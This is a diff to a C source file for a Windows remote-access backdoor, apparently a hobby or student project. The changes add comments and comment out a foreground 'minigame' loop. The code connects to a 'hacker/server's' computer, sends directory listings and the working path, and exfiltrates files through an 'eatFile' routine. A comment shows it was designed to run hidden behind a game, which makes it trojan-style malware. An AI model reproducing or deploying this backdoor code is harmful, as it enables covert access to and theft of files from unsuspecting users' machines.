@@ -18,10 +18,12 @@ int recv_size, awaamiErrorCode;
 
 // Repetitive code declared as functions here...
 
+// Called when any error is caught, to stop the program then and there
 void error() {
 	exit(1);
 }
 
+// Iniitialize Winsock
 void initWinSock() {
 	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
 	{
@@ -31,6 +33,7 @@ void initWinSock() {
 	
 }
 
+// Create socket
 void createPrepSock() {
 
 	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
@@ -40,6 +43,7 @@ void createPrepSock() {
 	}
 }
 
+// Connect to the hacker/server's computer
 int makeConnToServer() {
 
 	server.sin_addr.s_addr = inet_addr("127.0.0.1");
@@ -54,6 +58,7 @@ int makeConnToServer() {
 	return 1;
 }
 
+// Recieve data and put it in buffer
 int reliableRecieve() {
 
 	// Cleaning buffer before data comes.
@@ -69,11 +74,13 @@ int reliableRecieve() {
 	return 1;
 }
 
+// Send all data stored in buffer
 void reliableSend() {
 	//Sending message to client
 	send(s , buffer , strlen(buffer) , 0);
 }
 
+// Load the buffer with list of current folder contents
 void pullDirectoryData()
     {
         // Code to extract directory data
@@ -110,10 +117,12 @@ void pullDirectoryData()
         closedir(directory);
 }
 
+// Load the buffer with CWD Path
 void loadCWD() {
 	getcwd(buffer, sizeof(buffer));
 }
 
+// Load the buffer with any data
 void writeToBuffer(char data[]) {
 	// Clearing old data
 	memset(buffer,0,strlen(buffer));
@@ -122,6 +131,7 @@ void writeToBuffer(char data[]) {
 	strcpy(buffer, data);
 }
 
+// Function that eats any file
 int eatFile(char fileName[]) {
     int offset, n;
     FILE *filein;
@@ -154,6 +164,7 @@ int eatFile(char fileName[]) {
     return 1;
 }
 
+// Main function for backdoor operations
 int backdoor_main()
 {
 	// Main Code 
@@ -169,7 +180,7 @@ int backdoor_main()
 			Sleep(1000);
 			fprintf(stderr, "\r[+] Trying to connect...");
 			createPrepSock();
-			connected = makeConnToServer();
+			connected = makeConnToServer(); // returns 1 if successful
 		}
 
 		fprintf(stderr, "\n\n[+] Connected\n");
@@ -181,7 +192,7 @@ int backdoor_main()
 				if (awaamiErrorCode != 0) break;
 			}
 
-			// Checking if connection was broken.
+			// Checking if connection is still intact.
 			if (awaamiErrorCode == 1)
 			{
 				// Checking option selected by server
@@ -286,10 +297,10 @@ void *thread1() {
 
 // Runs the minigame in the foreground
 void *thread2() {
-	while(1) {
-		fprintf(stderr, "Hello Jee, I'm also here!\n");
-		Sleep(1000);
-	}
+	// while(1) {
+	// 	fprintf(stderr, "Hello Jee, I'm also here!\n");
+	// 	Sleep(1000);
+	// }
 }
 
 int main(int argc , char *argv[]) {
